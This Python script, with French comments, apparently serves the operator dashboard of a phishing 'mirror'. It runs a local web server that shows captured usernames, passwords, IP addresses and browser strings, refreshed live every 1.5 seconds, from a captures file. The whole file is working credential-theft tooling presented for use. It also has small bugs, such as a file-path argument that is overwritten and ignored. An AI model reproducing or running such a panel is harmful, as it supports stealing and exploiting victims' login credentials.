#!/usr/bin/env python3
# language: Python 3, file: mirror_eye.py, target: macOS
# L'OEIL DE L'EPOUVANTEUR : vue live des captures du miroir (rafraichi 1,5 s)
# Usage: python3 mirror_eye.py [port]   (8087)   — lire sorties/mirror_captures.json
import http.server, json, os, sys

PORT = int(sys.argv[1]) if len(sys.argv) > 1 else 8087
if len(sys.argv) > 2: CAPS_FILE = sys.argv[2]
CAPS = os.path.join(os.path.dirname(os.path.abspath(__file__)), "sorties", "mirror_captures.json")
CAPS_FILE = CAPS  # surchargeable : python3 mirror_eye.py [port] [fichier_captures]

def read_caps():
    try:
        return json.load(open(CAPS_FILE))
    except Exception:
        return []

HTML = """<!doctype html><html><head><meta charset=utf8><title>OEIL — captures live</title>
<meta http-equiv="refresh" content="1.5">
<style>
body{background:#050505;color:#ddd;font-family:monospace;margin:0;padding:26px}
h1{color:#7f7;margin:0 0 2px}h1 small{color:#f90;font-size:.5em;font-style:italic}
.stat{color:#7f7;font-size:.9em;margin-bottom:16px}
table{border-collapse:collapse;width:100%;font-size:.9em}
th{color:#7f7;text-align:left;border-bottom:1px solid #2a2;padding-bottom:6px}
td{border-bottom:1px solid #161616;padding:8px 10px;vertical-align:top}
.creds{color:#ffd60a}.ip{color:#7fbfff}.ua{color:#888;font-size:.82em}
.new{background:#0d1a0d}
</style></head><body>
<h1>OEIL DE L'EPOUVANTEUR <small>— powered by Maxime Leal</small></h1>
<div class="stat" id="stat">…</div>
<table><tr><th>Heure</th><th>IP</th><th>Identifiant</th><th>Mot de passe</th><th>Machine / navigateur</th></tr>
<tbody id="rows"></tbody></table>
<script>
function esc(s){return (s||'').replace(/</g,'&lt;');}
var last = __LAST__;
var rows = __DATA__;
function render(){
  var caps = __DATA__;
  var el = document.getElementById('rows'); el.innerHTML = '';
  document.getElementById('stat').textContent = caps.length + ' capture(s) — rafraichi toutes les 1,5 s — miroir :8086';
  caps.slice().reverse().forEach(function(c, i){
    var tr = document.createElement('tr');
    tr.className = (caps.length - 1 - i) >= last ? 'new' : '';
    tr.innerHTML = `<td>${esc(c.heure)}</td><td class="ip">${esc(c.ip)}</td>
      <td class="creds">${esc(c.identifiant)}</td><td class="creds">${esc(c.mot_de_passe)}</td>
      <td class="ua">${esc(c.user_agent).slice(0,110)}</td>`;
    el.appendChild(tr);
  });
}
render();
</script></body></html>"""

class H(http.server.BaseHTTPRequestHandler):
    def _send(self, b, ctype="text/html"):
        self.send_response(200); self.send_header("Content-Type", ctype)
        self.send_header("Content-Length", str(len(b))); self.end_headers(); self.wfile.write(b)
    def do_GET(self):
        import urllib.parse
        u = urllib.parse.urlparse(self.path)
        if u.path == "/":
            caps = read_caps()
            page = HTML.replace("__LAST__", str(max(0, len(caps) - 1))).replace("__DATA__", json.dumps(caps, ensure_ascii=False))
            self._send(page.encode())
        elif u.path == "/api":
            self._send(json.dumps(read_caps()).encode(), "application/json")
    def log_message(self, *a): pass

if __name__ == "__main__":
    print(f"[*] OEIL sur http://127.0.0.1:{PORT} — source : {CAPS}")
    http.server.HTTPServer(("0.0.0.0", PORT), H).serve_forever()
